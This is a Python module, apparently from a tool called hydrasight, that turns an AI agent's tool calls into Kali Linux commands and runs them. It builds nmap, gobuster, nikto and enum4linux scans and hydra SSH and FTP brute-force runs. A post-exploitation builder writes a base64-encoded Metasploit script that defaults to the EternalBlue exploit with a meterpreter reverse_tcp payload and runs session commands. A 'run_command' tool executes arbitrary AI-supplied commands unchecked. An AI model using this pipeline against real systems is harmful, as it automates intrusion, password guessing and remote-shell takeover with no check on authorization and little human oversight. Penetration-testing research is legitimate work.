"""
Dispatcher — translates AI tool-call dicts into shell commands
and executes them via KaliAPI.
"""
import base64
import logging
import re
import textwrap
import time
from typing import Optional

from hydrasight.config.defaults import TOOL_TIMEOUTS, NIKTO_MAXTIME
from hydrasight.integrations.kali_api import KaliAPI
from hydrasight.utils.ip_utils import is_valid_ip, force_ip


class Dispatcher:
    """Translates AI tool-call dicts into shell commands and runs them."""

    canonical_target: Optional[str] = None

    def __init__(
        self,
        kali : KaliAPI,
        log  : logging.Logger,
        cfg  : dict,
    ) -> None:
        self.kali = kali
        self.log  = log
        self.cfg  = cfg

    # ── IP sanitisation ───────────────────────────────────────────────────────

    def _get_preserve_ips(self) -> list[str]:
        preserve = ["127.0.0.1"]
        if self.canonical_target:
            lhost = self.kali.local_ip(self.canonical_target)
            if lhost and lhost not in preserve:
                preserve.append(lhost)
        return preserve

    # ── dispatch ──────────────────────────────────────────────────────────────

    def dispatch(self, tool_call: dict) -> tuple[str, str, float]:
        tool = tool_call.get("tool", "")
        args = dict(tool_call.get("args", {}) or {})

        preserve_ips = self._get_preserve_ips()

        if self.canonical_target:
            tgt = self.canonical_target
            if "target" in args:
                args["target"] = tgt
            if "url" in args:
                args["url"] = force_ip(
                    args["url"], tgt, preserve=preserve_ips
                )
            for key in ("additional_args", "command", "commands"):
                if key in args and isinstance(args[key], str):
                    args[key] = force_ip(
                        args[key], tgt, preserve=preserve_ips
                    )

        cmd = self._build(tool, args)
        if not cmd:
            return tool, f"[ERROR] unknown tool: {tool}", 0.0

        if self.canonical_target and tool != "post_exploit":
            cmd = force_ip(
                cmd, self.canonical_target, preserve=preserve_ips
            )

        timeout = TOOL_TIMEOUTS.get(tool, 300)
        t0      = time.time()
        result  = self.kali.run(cmd, timeout=timeout)
        elapsed = time.time() - t0
        output  = result.get("output", "")
        if not output and not result.get("success", True):
            output = f"[ERROR] {result.get('error', 'unknown error')}"
        return tool, output, elapsed

    # ── command builders ──────────────────────────────────────────────────────

    def _build(self, tool: str, args: dict) -> str:
        builders = {
            "nmap_scan"     : self._nmap,
            "gobuster_scan" : self._gobuster,
            "nikto_scan"    : self._nikto,
            "whatweb_scan"  : self._whatweb,
            "post_exploit"  : self._post_exploit,
            "smb_enum"      : self._smb_enum,
            "ssh_brute"     : self._ssh_brute,
            "ftp_brute"     : self._ftp_brute,
            "run_command"   : lambda a: a.get("command", "echo ok"),
        }
        fn = builders.get(tool)
        return fn(args) if fn else ""

    def _nmap(self, a: dict) -> str:
        target = a.get("target", "")
        ports  = a.get("ports", "1-1000")
        raw    = f"{a.get('scan_type', '-sV')} {a.get('additional_args', '')}"
        tokens : list[str] = raw.split()
        seen   : set[str]  = set()
        flags  : list[str] = []
        i = 0
        while i < len(tokens):
            t = tokens[i]
            if t == "-p":
                i += 2
                continue
            if t.startswith("-p") and len(t) > 2:
                i += 1
                continue
            if t and t not in seen:
                seen.add(t)
                flags.append(t)
            i += 1
        return f"nmap {' '.join(flags)} -p {ports} {target}"

    def _gobuster(self, a: dict) -> str:
        url = a.get("url", "")
        wl  = a.get(
            "wordlist",
            self.cfg.get("wordlist", "/usr/share/wordlists/dirb/common.txt"),
        )
        ext = f"-x {a['extensions']}" if a.get("extensions") else ""
        return (
            f"gobuster dir -u {url} -w {wl} {ext} "
            f"--no-color -q -t 30 --timeout 10s "
            f"-a 'Mozilla/5.0' -k 2>&1"
        )

    def _nikto(self, a: dict) -> str:
        return (
            f"nikto -h {a.get('target', '')} -p {a.get('port', 80)} "
            f"-maxtime {NIKTO_MAXTIME} 2>&1"
        )

    def _whatweb(self, a: dict) -> str:
        return (
            f"whatweb -a 3 --max-redirects=2 {a.get('url', '')} 2>&1"
        )

    def _smb_enum(self, a: dict) -> str:
        return f"enum4linux -S {a.get('target', '')} 2>&1 | head -150"

    def _ssh_brute(self, a: dict) -> str:
        target = a.get("target", "")
        ul = a.get(
            "userlist",
            "/usr/share/wordlists/metasploit/unix_users.txt",
        )
        pl = a.get("passlist", "/usr/share/wordlists/fasttrack.txt")
        return (
            f"timeout 300 hydra -L {ul} -P {pl} -t 4 -f -e nsr "
            f"ssh://{target} 2>&1 | tail -40"
        )

    def _ftp_brute(self, a: dict) -> str:
        target = a.get("target", "")
        ul = a.get(
            "userlist",
            "/usr/share/wordlists/metasploit/unix_users.txt",
        )
        pl = a.get("passlist", "/usr/share/wordlists/fasttrack.txt")
        return (
            f"timeout 300 hydra -L {ul} -P {pl} -t 4 -f -e nsr "
            f"ftp://{target} 2>&1 | tail -40"
        )

    def _post_exploit(self, a: dict) -> str:
        module   = a.get(
            "module", "exploit/windows/smb/ms17_010_eternalblue"
        )
        target   = a.get("target", "")
        rport    = a.get("rport", 445)
        lport    = a.get("lport", 4444)
        payload  = a.get("payload", "windows/meterpreter/reverse_tcp")
        commands = a.get("commands", "getuid")
        lhost    = self.kali.local_ip(target)

        cmd_block: list[str] = []
        for c in commands.split(";"):
            c = c.strip()
            if not c:
                continue
            cmd_block.append(f'sessions -i -1 -C "{c}"')
            cmd_block.append("sleep 4")

        is_aux       = module.startswith("auxiliary/")
        payload_line = (
            "" if (is_aux or not payload) else f"set PAYLOAD {payload}"
        )
        action_line  = "run" if is_aux else "exploit -z"

        rc_content = textwrap.dedent(f"""\
            use {module}
            set RHOSTS {target}
            set RPORT {rport}
            set LHOST {lhost}
            set LPORT {lport}
            {payload_line}
            set ExitOnSession false
            set WfsDelay 30
            set EnableStageEncoding true
            {action_line}
            sleep 10
            sessions -l
            {chr(10).join(cmd_block)}
            sleep 5
            sessions -K
            exit -y
        """)

        b64 = base64.b64encode(rc_content.encode()).decode()
        return (
            f"printf '%s' '{b64}' | base64 -d > /tmp/hs_exploit.rc && "
            f"msfconsole -q -r /tmp/hs_exploit.rc 2>&1 ; "
            f"rm -f /tmp/hs_exploit.rc"
        )
